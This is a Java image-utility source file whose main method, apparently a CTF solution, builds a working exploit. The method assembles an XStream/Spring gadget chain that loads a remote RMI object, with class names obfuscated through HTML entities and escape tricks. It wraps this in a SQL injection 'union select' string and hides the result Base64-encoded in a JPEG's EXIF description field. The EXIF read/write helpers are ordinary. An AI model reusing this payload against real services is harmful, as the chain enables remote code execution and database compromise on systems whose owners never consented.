package nese.game.util;

import nese.game.data.ExifInfo;
import org.apache.commons.imaging.*;
import org.apache.commons.imaging.common.ImageMetadata;
import org.apache.commons.imaging.common.RationalNumber;
import org.apache.commons.imaging.common.bytesource.ByteSourceFile;
import org.apache.commons.imaging.formats.jpeg.JpegImageMetadata;
import org.apache.commons.imaging.formats.jpeg.exif.ExifRewriter;
import org.apache.commons.imaging.formats.tiff.TiffField;
import org.apache.commons.imaging.formats.tiff.TiffImageMetadata;
import org.apache.commons.imaging.formats.tiff.constants.ExifTagConstants;
import org.apache.commons.imaging.formats.tiff.constants.GpsTagConstants;
import org.apache.commons.imaging.formats.tiff.constants.TiffTagConstants;
import org.apache.commons.imaging.formats.tiff.taginfos.TagInfo;
import org.apache.commons.imaging.formats.tiff.write.TiffOutputDirectory;
import org.apache.commons.imaging.formats.tiff.write.TiffOutputSet;
import org.springframework.web.multipart.MultipartFile;

import java.awt.image.BufferedImage;
import java.io.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * @author wh1t3P1g
 * @since 2020/10/15
 */
public class ImageUtil {

    public static ExifInfo readMetaData(InputStream file, String filename) throws IOException, ImageReadException {
        final ImageMetadata metadata = Imaging.getMetadata(file, filename);
        if (metadata instanceof JpegImageMetadata) {
            final JpegImageMetadata jpegMetadata = (JpegImageMetadata) metadata;
            return ExifInfo.parse(jpegMetadata);
        }
        return null;
    }

    public static void transferTo(InputStream file, byte[] jpegbytes, String filename, File dest, String secret, String hash) throws IOException, ImageReadException, ImageWriteException {
        final ImageMetadata metadata = Imaging.getMetadata(jpegbytes);
        TiffOutputSet outputSet = null;

        // note that metadata might be null if no metadata is found.
        final JpegImageMetadata jpegMetadata = (JpegImageMetadata) metadata;
        if (null != jpegMetadata) {
            // note that exif might be null if no Exif metadata is found.
            final TiffImageMetadata exif = jpegMetadata.getExif();

            if (null != exif) {
                // TiffImageMetadata class is immutable (read-only).
                // TiffOutputSet class represents the Exif data to write.
                //
                // Usually, we want to update existing Exif metadata by
                // changing
                // the values of a few fields, or adding a field.
                // In these cases, it is easiest to use getOutputSet() to
                // start with a "copy" of the fields read from the image.
                outputSet = exif.getOutputSet();
            }
        }

        // if file does not contain any exif metadata, we create an empty
        // set of exif metadata. Otherwise, we keep all of the other
        // existing tags.
        if (null == outputSet) {
            outputSet = new TiffOutputSet();
        }

        final TiffOutputDirectory exifDirectory = outputSet.getOrCreateExifDirectory();
        // make sure to remove old value if present (this method will
        // not fail if the tag does not exist).
        exifDirectory.removeField(TiffTagConstants.TIFF_TAG_MAKE);
        exifDirectory.add(TiffTagConstants.TIFF_TAG_MAKE, "Signed By NeSE");

        exifDirectory.removeField(TiffTagConstants.TIFF_TAG_IMAGE_DESCRIPTION);
        exifDirectory.add(TiffTagConstants.TIFF_TAG_IMAGE_DESCRIPTION,
                Base64.getEncoder().encodeToString(secret.getBytes()) +":"+hash);
        try (FileOutputStream fos = new FileOutputStream(dest);
             OutputStream os = new BufferedOutputStream(fos)) {
            new ExifRewriter().updateExifMetadataLossless(jpegbytes, os, outputSet);
        }

    }


    public static void main(String[] args) {
        String target = "xxxx:1099/evilObj"; // rmi reference 地址
        String payload = "<map>\n" +
                "  <entry>\n" +
                "    <org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor serialization=\"cust&#111;m\">\n" +
                "      <org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>\n" +
                "        <default>\n" +
                "          <adviceBeanName>&#x72;&#x6d;&#x69;://"+target+"</adviceBeanName>\n" +
                "          <beanFactory class=\"org.s&#x70;ringframework.jndi.support.SimpleJndiBeanFactory\">\n" +
                "            <logger class=\"org.&#x61;pache.commons.logging.impl.NoOpLog\"/>\n" +
                "            <jndiTemplate>\n" +
                "              <logger class=\"org.&#x61;pache.commons.logging.impl.NoOpLog\"/>\n" +
                "            </jndiTemplate>\n" +
                "            <resourceRef>true</resourceRef>\n" +
                "            <shareableResources>\n" +
                "              <string>&#x72;&#x6d;&#x69;://"+target+"</string>\n" +
                "            </shareableResources>\n" +
                "            <singletonObjects/>\n" +
                "            <resourceTypes/>\n" +
                "          </beanFactory>\n" +
                "        </default>\n" +
                "      </org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>\n" +
                "      <org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor>\n" +
                "        <default>\n" +
                "          <pointcut class=\"org.s&#x70;ringframework.aop.TruePointcut\"/>\n" +
                "        </default>\n" +
                "      </org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor>\n" +
                "    </org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor>\n" +
                "    <org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor reference=\"../org.s&#x70;ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor\"/>\n" +
                "  </entry>\n" +
                "  <entry>\n" +
                "    <org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor serialization=\"custom\">\n" +
                "      <org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>\n" +
                "        <default>\n" +
                "          <adviceBeanName>&#x72;&#x6d;&#x69;://"+target+"</adviceBeanName>\n" +
                "          <beanFactory class=\"org.s&#x70;ringframework.jndi.support.SimpleJndiBeanFactory\" reference=\"../../../../../entry/org.s&#x70;ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor/org.s&#x70;ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor/default/beanFactory\"/>\n" +
                "        </default>\n" +
                "      </org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>\n" +
                "      <org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor>\n" +
                "        <default>\n" +
                "          <pointcut class=\"org.s&#x70;ringframework.aop.TruePointcut\" reference=\"../../../../../entry/org.s&#x70;ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor/org.s&#x70;ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor/default/pointcut\"/>\n" +
                "        </default>\n" +
                "      </org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor>\n" +
                "    </org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor>\n" +
                "    <org.s_.0070ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor reference=\"../org.s&#x70;ringframework.aop.support.DefaultBeanFactoryPointcutAdvisor\"/>\n" +
                "  </entry>\n" +
                "</map>";
        try{
            File file = new File("/Users/wh1t3P1g/Downloads/b5a676b33552ecbe793c9a409b196493.jpg");
            File dest = new File("/Users/wh1t3P1g/Downloads/b5a676b33552ecbe793c9a409b196493.jpg");
            InputStream inputStream = new FileInputStream(file);
            byte[] bytes = new byte[(int)file.length()];
            inputStream.read(bytes);
            InputStream destInputStream = new FileInputStream(dest);
            String secret="' union select 13,'wh1t3p1g','wh1t3p1g','"+payload+"','aed2bebb781ae32d94c5e67185e35149";
            String hash = "aed2bebb781ae32d94c5e67185e35149";
            ImageUtil.transferTo(inputStream, bytes, null, dest, secret, hash);
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
